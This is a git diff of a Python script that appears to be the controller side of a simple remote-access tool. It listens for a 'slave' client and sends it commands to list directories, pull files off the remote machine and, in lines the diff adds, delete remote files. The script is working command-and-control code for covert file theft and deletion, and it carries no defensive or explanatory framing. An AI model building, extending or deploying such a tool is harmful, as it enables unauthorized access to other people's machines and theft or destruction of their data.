@@ -1,42 +1,47 @@
 #!/usr/bin/env python
 #_*_ coding utf8 _*_
 
+
 import os
 import socket
+from colorama import Fore, init
+
+init()
 
 s = socket.socket() #socket instance
 host = socket.gethostname() #getting name of the operating system machine
 port = 8080 
 s.bind((host, port)) #assign an ip and port to the socket instance for establish connection with other machine
-print("\nServer is currently running at @",host)
-print("\nWaiting for connections...")
+print("\n{}[{}+{}]Server is currently running at {}@{}".format(Fore.LIGHTWHITE_EX, Fore.LIGHTGREEN_EX,Fore.LIGHTWHITE_EX, Fore.LIGHTGREEN_EX, host))
+print("\n{}Waiting for connections...".format(Fore.LIGHTWHITE_EX))
 s.listen(1) #waiting for connections (from slave.py in this case)
 conn, addr = s.accept() #accept the connection
-print(addr, "Has connected to the server successfully")
+print("{}{}{} Has connected to the server successfully".format(Fore.LIGHTGREEN_EX, addr, Fore.LIGHTWHITE_EX))
 
 #connection has been complete
 
 #command handling
 
 while True:
-    command = input(str("\nCommand >>> "))
+    print(Fore.LIGHTCYAN_EX)
+    command = input(str("Command >>> "))
     if command == "getcwd":
         conn.send(command.encode()) #send the command to slave script for execution
-        print("\nCommand sent, waiting for execution...")
+        print("\n{}Command sent, waiting for execution...".format(Fore.LIGHTWHITE_EX))
         directory = conn.recv(5000) #receive the response from the slave script
         directory = directory.decode() #decode the received info
         files = conn.recv(5000)
         files = files.decode()
-        print("\nDirectory: {} \nFiles: {}".format(directory, files)) #show received info
+        print("\n{}Directory: {}{}{} \nFiles: {}{}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX,directory,Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, files)) #show received info
 
     elif command == "custom_dir":
         conn.send(command.encode()) #send command to slave script
         userInput = input(str(" >Set custom dir: "))
         conn.send(userInput.encode()) #send the custom dir
-        print("\nCommand has been sent")        
+        print("\n{}Command has been sent...".format(Fore.LIGHTWHITE_EX))        
         files = conn.recv(5000) #receive data from slave script           
         files = files.decode()
-        print("Custom dir result: {}".format(files)) 
+        print("{}\nCustom dir result: {}{}".format(Fore.LIGHTGREEN_EX,Fore.LIGHTWHITE_EX, files)) 
 
     elif command == 'download_file':   
         conn.send(command.encode()) 
@@ -47,7 +52,19 @@ while True:
         newFile = open(fileName, "wb") #create a file whit the original name and original extension
         newFile.write(file)#write info into the new file
         newFile.close()
-        print('\nFile has been downloaded and saved') 
+        print('\n{}[{}+{}]File has been downloaded and saved'.format(Fore.LIGHTWHITE_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))
+
+    elif command == 'remove_file':
+        conn.send(command.encode())
+        userInput = input(str(' >Set path with file and extension: '))
+        conn.send(userInput.encode())
+        log = conn.recv(5000) #receive an error if it was ocurred or the mesagge of succesfully removed file 
+        log = log.decode()
+        print(log)
+
+    elif command == 'exit':
+        conn.send(command.encode())
+        quit() 
 
     else:
-        print("\nCommand not recognised")
+        print("\n{}[{}*{}]Command not recognised".format(Fore.LIGHTWHITE_EX, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
